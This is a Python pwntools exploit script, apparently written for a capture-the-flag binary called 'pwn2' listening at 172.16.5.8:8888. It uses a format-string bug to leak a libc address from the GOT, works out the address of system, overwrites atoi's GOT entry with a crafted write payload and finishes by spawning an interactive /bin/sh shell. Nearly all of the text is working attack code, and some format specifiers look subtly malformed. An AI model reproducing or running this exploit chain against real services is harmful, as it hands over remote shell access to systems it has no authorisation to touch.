#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
from pwn import *

''' fmtstr offset = 7 '''

context.log_level = 'debug'

exe_name = './pwn2'
exe = ELF(exe_name)

if len(sys.argv) == 1:
    io = process(exe_name)
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
else:
    io = remote('172.16.5.8', 8888)
    libc = ELF('./libc.so.6')
suffix = len('GET YOUR AGE:\n')

def leak(addr):
    buf = list()
    va = addr
    while len(buf) < 4:
        io.sendlineafter('PLAY[Y/N]\n', 'Y')
        io.sendafter('NAME:\n\n', '%9$s'.ljust(8, '\x00') + p32(va))
        io.recvuntil('WELCOME \n')
        r = io.recvuntil('AGE:\n')
        io.sendline('10')
        r = r[ : -suffix]
        if len(r) == 0:
            buf.append('\x00')
            va += 1
        else:
            buf.extend(r)
            va += len(r)
    ret = ''.join(buf[:4])
    return ret

''' if connect to Internet, we can use this to find address of libc_system '''
# d = DynELF(leak, elf=exe)
# libc_system = d.lookup('system', 'libc')
# log.success('libc_system = %s', hex(libc_system))

''' else with libc '''
exe_got_read = u32(leak(exe.got['read']))
log.success('exe_got_read = %s', hex(exe_got_read))
log.debug('libc_system = %s', hex(libc.symbols['system']))
log.debug('libc_read = %s', hex(libc.symbols['read']))
exe_system = libc.symbols['system'] - libc.symbols['read'] + exe_got_read
log.success('exe_system = %s', hex(exe_system))

''' hack into got[atoi] '''
got_atoi = exe.got['atoi']
log.success('got_atoi = %s', hex(got_atoi))


s = raw_input('input system addr: ')
# try:
#     exe_system = int(s, 16)
# except:
#     pass

byte0 = exe_system & 0xff
log.debug('byte0 = %s', hex(byte0))
byte1 = (exe_system & 0xffff00) >> 8
log.debug('byte1 = %s', hex(byte1))
size0 = byte0 if byte0 > 0 else 256
size1 = byte1 - size0
just_len = 32
offset0 = 7 + just_len / 4
offset1 = offset0 + 1

io.sendlineafter('PLAY[Y/N]\n', 'Y')
pls = [
    '%{size0}c%{offset0}$hn%{size1}c%{offset1}$hnn'.format\
    (size0=size0, offset0=offset0, size1=size1, offset1=offset1).ljust(just_len),
    p32(got_atoi),
    p32(got_atoi + 1),
]
payload = ''.join(pls)
io.sendafter('NAME:\n\n', payload)
io.sendafter('AGE:\n', '/bin/sh\x00')

io.interactive()
io.close()
